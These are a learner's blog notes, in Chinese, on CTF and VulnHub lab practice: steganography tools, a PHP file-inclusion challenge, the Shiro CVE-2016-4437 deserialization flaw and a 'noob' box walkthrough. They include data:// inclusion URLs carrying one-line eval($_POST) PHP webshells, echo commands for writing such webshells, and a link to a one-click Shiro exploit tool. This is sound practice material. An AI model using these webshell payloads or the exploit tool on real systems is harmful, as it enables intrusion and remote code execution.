<h4 id="此类比赛的赛题形式如下"><a href="#此类比赛的赛题形式如下" class="headerlink" title="此类比赛的赛题形式如下:"></a>此类比赛的赛题形式如下:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA。</span><br><span class="line">  MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</span><br><span class="line"></span><br><span class="line">PPC(Professionally Program Coder)类型，即编程类题目，题目涉及到编程算法，相比ACM较为容易。</span><br><span class="line"></span><br><span class="line">CRYPTO(Cryptography)类型，即密码学，题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术。</span><br><span class="line"></span><br><span class="line">PWN类型，PWN在黑客俚语中代表着攻破、取得权限，多为溢出类题目。</span><br><span class="line"></span><br><span class="line">REVERSE类型，即逆向工程，题目涉及到软件逆向、破解技术。</span><br><span class="line"></span><br><span class="line">STEGA(Steganography)类型，即隐写术，题目的Flag会隐藏到图片、音频、视频等各类数据载体中供参赛者获取。</span><br><span class="line"></span><br><span class="line">WEB类型，即题目会涉及到常见的Web漏洞，诸如注入、XSS、文件包含、代码执行等漏洞。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在其中MISC杂项STEGA(隐写术)属实是让人意想不到,初次接触我就被吓到了,此类题目一般以文本加密隐写,声音音频隐写,图像加密隐写等等,在后文我会详细学习记录这方面的内容</p>
<p><strong>注:隐写项目对于真实环境渗透测试提升不大,不必花大量时间去将其原理弄懂,只求在比赛时能基础分辨其属于什么方面的隐写类型,用什么工具解决,确实不懂时可以遇到时百度.</strong></p>
<h3 id="攻防赛"><a href="#攻防赛" class="headerlink" title="攻防赛"></a>攻防赛</h3><p>需要在一场比赛里要扮演攻击方和防守方，攻者得分，失守者会被扣分.(听fly师傅说这种类型的比赛可能需要邀请函.)</p>
<p>此类比赛模式非常激烈,准备需要非常充足,</p>
<h4 id="需要积累足够的防守方案和-EXP-攻击脚本"><a href="#需要积累足够的防守方案和-EXP-攻击脚本" class="headerlink" title="需要积累足够的防守方案和 EXP 攻击脚本"></a>需要积累足够的防守方案和 EXP 攻击脚本</h4><p>(或许我也可以准备这一类的方案,从小开始这样以后也能在工作时给出一个防御方案或者攻击方案,或许是一个不错的主意.)</p>
<h1 id="MISC杂项"><a href="#MISC杂项" class="headerlink" title="MISC杂项:"></a>MISC杂项:</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://blog.csdn.net/qq_44204058/article/details/119963209"> CTF学习-MISC杂项解题思路_菜鸟-传奇的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_53105813/article/details/125604924?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-125604924-blog-119963209.pc_relevant_3mothn_strategy_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-125604924-blog-119963209.pc_relevant_3mothn_strategy_recovery&utm_relevant_index=2">CTF MISC解题思路总结篇_Dalean.的博客-CSDN博客_ctf misc解题思路</a></p>
<p>我抄,不搜不知道,一搜吓一跳,光这杂项就分为:</p>
<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作:"></a>文件操作:</h2><p> 判断文件类型     </p>
<p>文件头残缺/错误 </p>
<p>文件分离操作</p>
<p>文件合并操作</p>
<h2 id="文件隐写"><a href="#文件隐写" class="headerlink" title="文件隐写:"></a>文件隐写:</h2><h3 id="图片隐写的常见隐写方法"><a href="#图片隐写的常见隐写方法" class="headerlink" title="图片隐写的常见隐写方法"></a>图片隐写的常见隐写方法</h3><p>1.细微的颜色差别<br>2.GIF图多帧隐藏<br>1.颜色通道隐藏<br>2.不同帧图信息隐藏<br>3.不同帧对比隐写<br>3.Exif信息隐藏<br>4.图片修复<br>1.图片头修<br>2.图片尾修复<br>3.CRC校验修复<br>4.长、宽、高度修复<br>5.最低有效位LSB隐写<br>6.图片加密</p>
<h4 id="记一次图片修复题目"><a href="#记一次图片修复题目" class="headerlink" title="记一次图片修复题目:"></a>记一次图片修复题目:</h4><p>首先是题目链接:</p>
<p><a href="https://adworld.xctf.org.cn/challenges/details?hash=ba10541a-1310-11ed-9802-fa163e4fa66d&amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=ba10541a-1310-11ed-9802-fa163e4fa66d&amp;task_category_id=1</a></p>
<p>此次题目是二维码图片被垂直剪切为50份,我们要做的就是找出这50份之间的规律,此次题目文件排布规律是按日期排列.</p>
<p>使用线上图片合并网站<a href="https://cdkm.com/cn/">https://cdkm.com/cn/</a></p>
<p>进行图片的水平合并,上传文件时需要我们对文件进行一个按日期升序操作,传入图片合并后我们得到一个二维码</p>
<img src="/imgs/$%7Bfiilename%7D/%E4%BA%8C%E7%BB%B4%E7%A0%81.png" style="zoom:50%;" />

<p>调亮亮度后扫描二维码就能得到flag了</p>
<p>flag{You Can Repair A Picture From Splices Baesd On Entropy}</p>
<h3 id="图片隐写常用工具"><a href="#图片隐写常用工具" class="headerlink" title="图片隐写常用工具"></a>图片隐写常用工具</h3><p><strong>Our Secret</strong></p>
<p>一款用于文件加密的软件</p>
<p><strong>Firework</strong></p>
<p>查看隐写的图片文件，多帧gif啥的都可以使用此工具查看</p>
<p><strong>Stegsove</strong></p>
<p> 两张图片大小外观像素等基本相同时可以考虑对两个文件进行像素RGB值 XOB ADD SUB等操作，查看是否有有用的信息<br>等等…..</p>
<p>用到的时候可以直接百度</p>
<h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3><h4 id="音频隐写例子"><a href="#音频隐写例子" class="headerlink" title="音频隐写例子:"></a>音频隐写例子:</h4><p>音频隐写在我第一次打ctf练习题就遇见了,还是第一个遇见的题目,是攻防世界里的来自银河的声音(<a href="https://adworld.xctf.org.cn/challenges/details?hash=dffc332e-3b29-11ed-9802-fa163e4fa66d&amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=dffc332e-3b29-11ed-9802-fa163e4fa66d&amp;task_category_id=1</a>)</p>
<p>当时做这题时我听了两遍一开始不知道是什么类型的题目,看攻略得知mp3格式的音频文件使用MP3Stego工具进行加解密,然后我真的傻乎乎的按操作方法进行加解密,最后半个小时弄明白了这个工具的使用方法加解密后从这段音频里得到了 Hello Warld! 这句话,提交后发现不对,再进行分析搜索攻略后才发现flag藏在音频信号里,然后又去下了个MMSSTV工具,专门用于音频信号转换.</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221019181239.png"></p>
<p>最后转换出的图片中就包含flag,但这flag是采用栅栏密码加密的,所以图上文字栅栏密码解密就得到flag</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221019182134.png"></p>
<p>**付栅栏密码:**栅栏密码是一种简单的移动字符位置的加密方法，规则简单，容易破解。栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。</p>
<p><strong>付攻略链接:</strong><a href="https://blog.csdn.net/qq_62046273/article/details/127096230">( 攻防世界Misc-来自银河的信号_MUFFINHEAD！的博客-CSDN博客</a></p>
<h4 id="音频隐写分类"><a href="#音频隐写分类" class="headerlink" title="音频隐写分类:"></a>音频隐写分类:</h4><h5 id="常见工具"><a href="#常见工具" class="headerlink" title="常见工具"></a>常见工具</h5><p>Audacity，Adobe Audition(简称au)，SilentEye，DeepSound，MMSSTV，e2eSoft，mp3stego。</p>
<h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>第一步当然是先听一下有没有什么关键的信息，比如摩斯电码（有间隔的长短电波），SSTV（连续刺耳的电波），拨号隐写之类的。如果不知道是什么声音先自行百度，听过就不会忘。然后打开以上工具看一看是否存在什么隐写，如果都没有办法的话可以欣赏一下音乐就下号了。</p>
<h6 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h6><p>wav文件头：<code>52494646E6AD250357415645666D7420</code></p>
<h6 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h6><p><strong>使用工具：Audacity/Adobe Audition</strong><br><strong>文件类型：wav</strong><br>直接放大即可观察波形图即可。<br>可能存在摩斯电码，或者根据波峰波谷然后转换01二进制</p>
<h6 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h6><p><strong>使用工具：Audacity</strong><br><strong>文件类型：wav</strong><br>查看多视图</p>
<h6 id="有key的隐写"><a href="#有key的隐写" class="headerlink" title="有key的隐写"></a>有key的隐写</h6><p><strong>使用工具：silenteye、deepsound</strong><br><strong>文件类型：wav</strong><br>傻瓜式操作，知道这个软件就可以解出来，不知道就解不出。这两种隐写不一定需要key，但是有key一定要考虑这两种隐写。</p>
<h6 id="拨号隐写"><a href="#拨号隐写" class="headerlink" title="拨号隐写"></a>拨号隐写</h6><p>经常打10086的时候对方可能说需要XX服务请按1，需要XX服务请按2，对于不同的数字有不同的声音，就可以隐写一些数据。可以通过DTMF提取出来。<br>DTMF脚本地址：<a href="https://github.com/ribt/dtmf-decoder">https://github.com/ribt/dtmf-decoder</a></p>
<h6 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a>SSTV</h6><p>慢扫描电视（Slow-scan television 简称SSTV）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。<br>表示这玩意真的出烂了，傻瓜式操作<br><strong>使用工具：</strong>MMSSTV，e2eSoft<br>文件类型：wav<br>这里强推虚拟声卡e2eSoft这个工具。SSTV正常解法需要一台设备播放一台设备收音，还容易收到杂音的干扰，虚拟声卡就可以很好的避免这个问题。</p>
<h6 id="DIFF"><a href="#DIFF" class="headerlink" title="DIFF"></a>DIFF</h6><p><strong>使用工具：Adobe Audition</strong><br><strong>文件类型：wav</strong></p>
<h6 id="MP3隐写"><a href="#MP3隐写" class="headerlink" title="MP3隐写"></a>MP3隐写</h6><p><strong>使用工具：mp3stego</strong><br><strong>文件类型：mp3</strong></p>
<p>工具使用方法:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 隐藏信息</span><br><span class="line"># —E 读取隐藏信息文件的内容，-P 设置密码</span><br><span class="line">encode.exe -E hidden_text.txt -P pass svega.wav svega_stego.mp3</span><br><span class="line"># 解密信息</span><br><span class="line">decode.exe -X svega_stego.mp3 -P pass</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接:"></a>原文链接:</h5><p><a href="https://blog.csdn.net/qq_51652400/article/details/123504708">(CTFmisc常见音频隐写总结_vlan103的博客-CSDN博客_ctf音频隐写</a></p>
<h2 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理:"></a>压缩文件处理:</h2><p>1.伪加密</p>
<p>2.暴力破解</p>
<p>3.RAR文件格式错误，导致解压不完全</p>
<h2 id="流量取证技术"><a href="#流量取证技术" class="headerlink" title="流量取证技术:"></a>流量取证技术:</h2><p> 工具Wireshark的使用</p>
<p>无线流量</p>
<p>usb键盘流量</p>
<p>键盘流量脚本</p>
<p>usb鼠标流量分析</p>
<p>鼠标流量分析脚本</p>
<p>https流量包分析</p>
<h1 id="web项目学习"><a href="#web项目学习" class="headerlink" title="web项目学习"></a>web项目学习</h1><h2 id="ctf题目：攻防世界：难度2的-Web-php-include题目"><a href="#ctf题目：攻防世界：难度2的-Web-php-include题目" class="headerlink" title="ctf题目：攻防世界：难度2的 Web_php_include题目"></a>ctf题目：攻防世界：难度2的 Web_php_include题目</h2><p>链接：<a href="https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3">https://adworld.xctf.org.cn/challenges/details?hash=ce6391a6-7070-4410-9d33-5b23967e77f1_2&amp;task_category_id=3</a></p>
<p>此题目突破口是php伪协议的运用，</p>
<p>具体解题可以参考：<a href="https://blog.csdn.net/Mr_helloword/article/details/107929653"> 攻防世界-Web_php_include详解_Mr H的博客-CSDN博客</a></p>
<p>php伪协议：<a href="https://blog.csdn.net/qq_53142368/article/details/116594299"> PHP伪协议_H0ne的博客-CSDN博客_php伪协议</a></p>
<h2 id="我的解题过程"><a href="#我的解题过程" class="headerlink" title="我的解题过程"></a>我的解题过程</h2><p>当我拿到题目的时候看到页面如下</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024155409.png"></p>
<p>第一时间就使用后台扫描工具：御剑 对网站后台进行了扫描</p>
<p>扫描发现了一个phpmyadmin界面，当时我就想到fly师傅里面记载的phpmyadmin的漏洞利用，翻去查看</p>
<p>（此网站phpmyadmin后台是无密码的root登录）</p>
<p>通过一系列操作下来后发现使用phpmyadmin漏洞来解决此题目有点费脑子，因为在运用全局日志文件写入shell和其他方式写入shell都离不开文件的绝对路径，</p>
<p>在扫描以及信息收集中发现该网站的路径就给了一个“/”并没给出绝对路径，</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024160357.png"></p>
<p>所以暂时运用phpmyadmin后台那shell的方法不可取</p>
<h2 id="搜攻略"><a href="#搜攻略" class="headerlink" title="搜攻略"></a>搜攻略</h2><p>在攻略中，老哥给了我们三种通过PHP伪协议拿flag的方法，前两种我都成功拿到了flag，</p>
<p>但老哥没给出第三种过程，现在我复现一下。</p>
<h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用法：</span><br><span class="line">data://text/plain,xxxx(要执行的php代码)</span><br><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br><span class="line">例：</span><br><span class="line">?page=data://text/plain,</span><br><span class="line">?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>data伪协议:</p>
<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的； data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</p>
<p>在这题里面我们通过使用data伪协议写入我们的shell语句</p>
<p><a href="http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST%5B666%5D);%20?%3E">http://61.147.171.105:52808/?page=data://text/plain,%3C?php%20@eval($_POST[666]);%20?%3E</a>      (<?php @eval($_POST[666]); ?>)</p>
<p><a href="http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==">http://61.147.171.105:52808/?page=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWzY2Nl0pOyA/Pg==</a></p>
<p>两种方式我都试过了,在这题里并没有拦截,使用base64编码和不使用也可以写入shell</p>
<p>使用菜刀链接到我们的shell</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221024161817842-1666599525637.png"></p>
<p>可以看到网站的文件目录,(但我找不到flag文件在哪里,只好抄作业了)</p>
<p>直接使用虚拟终端cat  打开flag文件</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221024162228.png"></p>
<p>flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&quot;ctf&#123;876a5fca-96c6-4cbd-9075-46f0c89475d2&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>注意:flag一般形式都不同,像本题就是在=”…”里面: ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p>
<h2 id="php危险函数"><a href="#php危险函数" class="headerlink" title="php危险函数"></a>php危险函数</h2><p>此题里面因为存在危险函数:show_source()  才能使用php伪协议破解题目</p>
<p>所以我们在做题时要留意题中出现的函数是什么有什么功能,不懂可以百度</p>
<p><strong>重要的还是要细心看题才行,不要养成看到代码就跳过的习惯,不然就白学了.</strong></p>
<p>show_source() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</p>
<p>用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。</p>
<p>show_source() 是 <a href="https://www.runoob.com/php/func-misc-highlight-file.html">highlight_file()</a> 的别名。</p>
<p><strong>注释：</strong>当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！</p>
<h2 id="其他形式的文件包含题目"><a href="#其他形式的文件包含题目" class="headerlink" title="其他形式的文件包含题目"></a>其他形式的文件包含题目</h2><h3 id="file-include：http-61-147-171-105-62550"><a href="#file-include：http-61-147-171-105-62550" class="headerlink" title="file_include：http://61.147.171.105:62550/"></a>file_include：<a href="http://61.147.171.105:62550/">http://61.147.171.105:62550/</a></h3><p>解题参考：<a href="https://blog.csdn.net/shelter1234567/article/details/127393549">江苏工匠杯_file _include_wp_昵称还在想呢的博客-CSDN博客</a></p>
<p>php伪协议：<a href="https://blog.csdn.net/woshilnp/article/details/117266628">(4条消息) 详解php://filter以及死亡绕过_w0s1np的博客-CSDN博客_php://filter</a></p>
<p><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">(4条消息) PHP伪协议详解_Snakin_ya的博客-CSDN博客_php伪协议</a></p>
<p><a href="https://www.php.cn/php-weizijiaocheng-481803.html">PHP伪协议大总结【欢迎收藏】-php教程-PHP中文网</a></p>
<p>文件包含是一个大项，其中的绕过是一个大学问，这题就涉及其他过滤器的问题。</p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/109300335">(4条消息) php://filter的各种过滤器_天问_Herbert555的博客-CSDN博客_php://filter rot13</a></p>
<p><img src="/imgs/$%7Bfiilename%7D/3.gif"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>shiro反序列化漏洞</title>
    <url>/2022/12/13/13-29-51/</url>
    <content><![CDATA[<h1 id="Shrio反序列化导致命令执行"><a href="#Shrio反序列化导致命令执行" class="headerlink" title="Shrio反序列化导致命令执行"></a>Shrio<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>导致命令执行</h1><h2 id="漏洞编号：CVE-2016-4437"><a href="#漏洞编号：CVE-2016-4437" class="headerlink" title="漏洞编号：CVE-2016-4437"></a>漏洞编号：CVE-2016-4437</h2><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088"> Shiro反序列化漏洞_風月长情的博客-CSDN博客_shiro反序列化漏洞</a></p>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>  Apache Shiro是一款开源企业常见JAVA安全框架，提供身份验证、授权、密码学和会话管理。java中的权限框架有SpringSecurity和Shiro，由于Spring功能强大但复杂，Shiro的简单强大，扩展性好因此用的还是很多。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Shiro &lt; 1.2.4</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p>
<p>1.检索RememberMe Cookie的值<br>2.Base 64解码<br>3.AES解密（加密密钥硬编码）<br>4.进行反序列化操作（未过滤处理）</p>
<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。</p>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征:"></a>漏洞特征:</h2><p>最主要的特征就是登录返回包中含有<strong>rememberMe=deleteMe</strong>字段</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221213141911.png"></p>
<p>准备充足在搞,先做好在本地复现的准备,安全第一</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h2><p>1.一键利用工具：</p>
<p>链接：<a href="https://pan.baidu.com/s/1kvQEMrMP-PZ4K1eGwAP0_Q?pwd=zbgp">https://pan.baidu.com/s/1kvQEMrMP-PZ4K1eGwAP0_Q?pwd=zbgp</a><br>提取码：zbgp</p>
<p><img src="/imgs/$%7Bfiilename%7D/image-20221213144910895.png" alt="image-20221213144910895"></p>
<p>工具使用：<a href="https://www.iculture.cc/forum-post/17719.html">加强版图形界面shiro反序列化漏洞利用工具 shiro_attack-网络攻防学习社区-安全圈子-FancyPig’s blog (iculture.cc)</a></p>
]]></content>
      <categories>
        <category>RCE</category>
      </categories>
      <tags>
        <tag>漏洞库</tag>
      </tags>
  </entry>
  <entry>
    <title>vlunhub noob靶场总结</title>
    <url>/2022/11/01/14-23-40/</url>
    <content><![CDATA[<h2 id="又开了新的vlunhub靶场—–noob靶场（菜鸟）"><a href="#又开了新的vlunhub靶场—–noob靶场（菜鸟）" class="headerlink" title="又开了新的vlunhub靶场—–noob靶场（菜鸟）"></a>又开了新的vlunhub靶场—–noob靶场（菜鸟）</h2><h1 id="首先还是先讲述遇到的问题："><a href="#首先还是先讲述遇到的问题：" class="headerlink" title="首先还是先讲述遇到的问题："></a>首先还是先讲述遇到的问题：</h1><h2 id="ftp服务浏览器访问不了"><a href="#ftp服务浏览器访问不了" class="headerlink" title="ftp服务浏览器访问不了"></a>ftp服务浏览器访问不了</h2><p>这个问题困扰许久，搜了好久说的好像都是浏览器的问题，到了现在许多浏览器都不支持链接到网站的ftp服务了。</p>
<h3 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h3><p>使用文件夹打开的方式：</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101143315.png"></p>
<p>如图所示在文件夹搜索框输入：<a href="ftp://192.168.50.130/">ftp://192.168.50.130</a>  就能直接链接到ftp服务了，但注意在本次的靶机上此ftp服务是默认无密码的形式开启的，有的ftp服务是需要输入账号密码的。本次靶机限定了读取和下载功能不能修改和上传.  (也是,如果能修改和上传直接改成一句话木马不就行了)</p>
<h1 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h1><p>在开始之前我们都要知道如何查找靶机的IP地址</p>
<h3 id="查找攻击机IP："><a href="#查找攻击机IP：" class="headerlink" title="查找攻击机IP："></a>查找攻击机IP：</h3><p>Linux：ifconfig</p>
<p>Windows：ipconfig</p>
<h3 id="网段扫描：-发现靶机IP"><a href="#网段扫描：-发现靶机IP" class="headerlink" title="网段扫描：(发现靶机IP)"></a>网段扫描：(发现靶机IP)</h3><p>kili: netdiscover -r 192.168.50.1/24</p>
<p>本次靶机相对于之前的earth靶机更容易，主要信息收集手段为nmap</p>
<p>使用nmap命令:</p>
<h3 id="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"><a href="#使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务" class="headerlink" title="使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务"></a>使用全端口扫描，使用默认端口扫描命令会扫不到改变了端口的服务</h3><p>命令： nmap -sV -Pn -sT -sC -A -p- 192.168.50.130</p>
<p>（应该开单章来说明一下信息收集中的工具命令）</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101150614.png"></p>
<p>如图所示,标下划线的为开启的服务，图中就能看出全端口扫描的作用</p>
<h1 id="通过ftp服务获取网站的登录账号密码"><a href="#通过ftp服务获取网站的登录账号密码" class="headerlink" title="通过ftp服务获取网站的登录账号密码"></a>通过ftp服务获取网站的登录账号密码</h1><p>如开头中所粘贴的图片所示，在ftp服务里将其中的两个文件下载到本地</p>
<p>在cre.txt 文件中得到一串base64加密过的字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Y2hhbXA6cGFzc3dvcmQ=</span><br></pre></td></tr></table></figure>

<p>解密得:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">champ:password</span><br></pre></td></tr></table></figure>

<p>使用账号密码登录:(当然在得到这个账号密码前肯定在这个登陆界面进行过其他的测试,如弱口令,注入等)</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151446.png"></p>
<p>登陆成功,在箭头所指的功能点,我们获取到一个.rar压缩文件.</p>
<h1 id="图片隐写破译"><a href="#图片隐写破译" class="headerlink" title="图片隐写破译"></a>图片隐写破译</h1><p>如图</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101151836.png"></p>
<p>在下载下的压缩文件里看到两张图片,根据攻略可知里面包含了图片隐写.(不看攻略你知道有这东西?实战里有谁会丧心病狂的将自己的账号密码隐写放在图片中.)</p>
<p>参考链接:<a href="https://www.cnblogs.com/sainet/p/15667985.html">Vulnhub 靶场 NOOB: 1 - sainet - 博客园 (cnblogs.com)</a></p>
<p>具体破译我就不尝试了,直接抄袭</p>
<p>最后得到ssh服务的登录账号密码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wtf:this one is a simple one</span><br></pre></td></tr></table></figure>





<h1 id="登录ssh"><a href="#登录ssh" class="headerlink" title="登录ssh"></a>登录ssh</h1><p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101152924.png"></p>
<p>如图箭头所示:</p>
<p>成功远程登陆上ssh服务</p>
<p>可以使用lastlog命令查看这台靶机的可以登录的账号以及登陆历史</p>
<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101154430.png"></p>
<p>有一些是我在测试时添加到账号.</p>
<h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg</span><br></pre></td></tr></table></figure>

<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221101155258.png"></p>
<p>从这张图可以看出我的历程,Linux命令不熟悉.</p>
<h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h1><p>在看了这两个协议后,我想通过这两个协议上传webshell</p>
<h2 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一:"></a>尝试一:</h2><p>使用ssh协议进行文件.</p>
<p>命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp /home/wugezhang/test.php wtf@192.168.50.130:/home/wtf/Downloads</span><br></pre></td></tr></table></figure>

<p>不成功:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh: connect to host 192.168.50.130 port 22: Connection refused</span><br><span class="line">scp: Connection closed </span><br><span class="line"></span><br><span class="line">ssh：连接到主机 192.168.50.130 端口 22：连接被拒绝</span><br><span class="line">SCP：连接已关闭</span><br></pre></td></tr></table></figure>

<p>一系列操作后发现不现实,如果能在对方环境添加环境变量更改设置了那传不传shell也无所谓了.</p>
<p>但做好权限维持才是持久的道理.</p>
<h2 id="尝试二"><a href="#尝试二" class="headerlink" title="尝试二:"></a>尝试二:</h2><p>使用匿名的ftp协议服务进行文件上传shell</p>
<p>尝试将文件上传进ftp服务的文件夹但失败了,我们只有下载与读的权限,没有上传与修改权限.</p>
<h2 id="尝试三"><a href="#尝试三" class="headerlink" title="尝试三:"></a>尝试三:</h2><p>尝试直接使用命令写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_post[test]);?&gt;&quot; &gt; test.php</span><br></pre></td></tr></table></figure>

<p>但失败了,在命令里直接就将$_post给执行了</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因:"></a>原因:</h3><p>1.Windows：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo ^&lt;? php @eval($_POST[&#x27;x&#x27;]); ?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure>

<p>知识点：</p>
<p>（1）^以转义字符的身份出现。因为在cmd环境中，有些字符具备特殊功能，如&gt;、&gt;&gt;表示重定向，|表示管道，&amp;、&amp;&amp;、||表示语句连接……它们都有特定的功度能，如果需要把它们作为字符输出知的话，echo &gt;、echo | ……之类的写法就会出错——cmd解释器会把它们作为具有特殊功能的字符对待，而不会作为普通字符处理，这个时候，就需道要对这些特殊字符做转义处理：在每个特殊字符回前加上转义字符^答，因此，要输出这些特殊字符，就需要用 echo ^&gt;、echo ^|、echo ^|^|、echo ^^……之类的格式来处理。此处转义&lt;和&gt;</p>
<p>（2） 此处^为什么不换成引号？因为windows写入时会把引号写进去</p>
<p>2.Linux:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;? php @eval($_POST[&quot;x&quot;]); ?&gt;&#x27; &gt;shell.php</span><br></pre></td></tr></table></figure>

<p>知识点：</p>
<p>$为linux系统的变量符号，原样输出字符串，不进行转义或取变量用单引号（此处否则会把$_POST当成变量处理）,x用双引号是为了和单引号区分</p>
<h4 id="其次"><a href="#其次" class="headerlink" title="其次"></a>其次</h4><p>我们要写入网站的目录文件里面才能远程链接到shell</p>
